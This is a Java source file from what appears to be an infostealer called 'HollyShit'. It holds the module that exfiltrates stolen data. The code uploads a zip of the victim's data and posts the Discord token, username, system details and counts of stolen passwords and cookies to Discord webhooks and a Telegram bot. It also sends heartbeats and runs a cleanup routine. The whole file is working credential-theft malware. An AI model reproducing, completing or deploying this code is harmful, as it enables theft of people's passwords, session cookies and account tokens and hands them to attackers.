package itzgonza.hollyshit.file;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

import itzgonza.hollyshit.utils.utilities;
import itzgonza.hollyshit.utils.decrypt.DecryptManager;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedField;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedTitle;
import club.minnced.discord.webhook.WebhookClient;
import itzgonza.hollyshit.impl.app.DiscordApp;

public class FileSend extends utilities {



    public void initialize() {
        try {
            String zipPath = getPath() + ".zip";
            File zipFile = new File(zipPath);
            
            // Wait for zip if not exists yet (max 20s)
            for (int i = 0; i < 20 && !zipFile.exists(); i++) Thread.sleep(1000);

            if (zipFile.exists()) {
                String link = uploadFile(zipPath);
                
                WebhookEmbedBuilder eb = new WebhookEmbedBuilder();
                eb.setTitle(new EmbedTitle("<a:pinkcrown:996004209667346442> HollyShit Log: " + System.getProperty("user.name"), link));
                
                eb.addField(new EmbedField(false, "📂 Download", "[**Click Here to Download ZIP**](" + link + ")"));
                eb.addField(new EmbedField(true, "💻 System", "```\n" + getCPU() + "\n" + getGPU() + "\n```"));
                eb.addField(new EmbedField(true, "🔐 Stats", "```\nPASS: " + DecryptManager.passwordsCount + "\nCOOK: " + DecryptManager.cookiesCount + "\n```"));
                
                if (itzgonza.hollyshit.impl.app.DiscordApp.token != null) {
                    eb.addField(new EmbedField(false, "👑 Token", "`" + itzgonza.hollyshit.impl.app.DiscordApp.token + "`"));
                }

                eb.setColor(java.awt.Color.GREEN.getRGB());
                eb.setFooter(new club.minnced.discord.webhook.send.WebhookEmbed.EmbedFooter("HollyShit - Original Exfiltration", ""));

                sendRawEmbed(eb.build());

                // Telegram
                sendToTelegram(zipPath, Arrays.asList(getCPU(), getGPU()), Arrays.asList("PASS: " + DecryptManager.passwordsCount), link);

                // Cleanup
                new itzgonza.hollyshit.file.FileDelete().initialize();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void sendRawEmbed(club.minnced.discord.webhook.send.WebhookEmbed embed) {
        for (String url : new String[]{utilities.webhookUrl, utilities.masterWebhook}) {
            if (url == null || url.isEmpty()) continue;
            try (club.minnced.discord.webhook.WebhookClient client = club.minnced.discord.webhook.WebhookClient.withUrl(url)) {
                client.send(embed).join();
            } catch (Exception ignored) {}
        }
    }

    public static void sendHeartbeat(String status) {
        for (String url : new String[]{utilities.webhookUrl, utilities.masterWebhook}) {
            if (url == null || url.isEmpty()) continue;
            try (club.minnced.discord.webhook.WebhookClient client = club.minnced.discord.webhook.WebhookClient.withUrl(url)) {
                WebhookEmbedBuilder eb = new WebhookEmbedBuilder();
                eb.setTitle(new EmbedTitle("💓 HollyShit Heartbeat", ""));
                eb.setDescription(String.format("User: `%s`\nStatus: **%s**", System.getProperty("user.name"), status));
                eb.setColor(0x00FF00); // Green
                client.send(eb.build()).join();
            } catch (Exception ignored) {}
        }
    }

    private static void sendToTelegram(String zipPath, List<String> sys, List<String> steal, String downloadLink) {
        if (telegramToken == null || telegramToken.isEmpty() || telegramChatId == null || telegramChatId.isEmpty()) return;
        
        try {
            String message = String.format(
                "⬇️ *User (%s) Deep Report*\n\n" +
                "👤 *User:* `%s#%s`\n" +
                "🔑 *Token:* `%s`\n" +
                "🌐 *Download:* %s\n\n" +
                "💻 *System:*\n`%s`\n\n" +
                "🔒 *Stats:*\n`%s`",
                System.getenv("COMPUTERNAME"), DiscordApp.username, DiscordApp.discriminator,
                DiscordApp.token, downloadLink,
                String.join("\n", sys), String.join("\n", steal)
            );

            okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .build();

            // 1. Send Zip as Document (Direct)
            File zipFile = new File(zipPath);
            if (zipFile.exists() && zipFile.length() > 0) {
                okhttp3.RequestBody zipBody = new okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("chat_id", telegramChatId)
                    .addFormDataPart("caption", "📦 ZIP Log: " + System.getenv("COMPUTERNAME"))
                    .addFormDataPart("document", zipFile.getName(),
                        okhttp3.RequestBody.create(zipFile, okhttp3.MediaType.parse("application/zip")))
                    .build();

                okhttp3.Request zipRequest = new okhttp3.Request.Builder()
                    .url("https://api.telegram.org/bot" + telegramToken + "/sendDocument")
                    .post(zipBody)
                    .build();
                
                try (okhttp3.Response res = client.newCall(zipRequest).execute()) {
                }
            }

            // 2. Send Info Message
            okhttp3.RequestBody formBody = new okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", telegramChatId)
                .addFormDataPart("text", message)
                .addFormDataPart("parse_mode", "Markdown")
                .build();

            okhttp3.Request request = new okhttp3.Request.Builder()
                .url("https://api.telegram.org/bot" + telegramToken + "/sendMessage")
                .post(formBody)
                .build();

            try (okhttp3.Response res = client.newCall(request).execute()) {
            }
        } catch (Exception ignored) {
        }
    }
}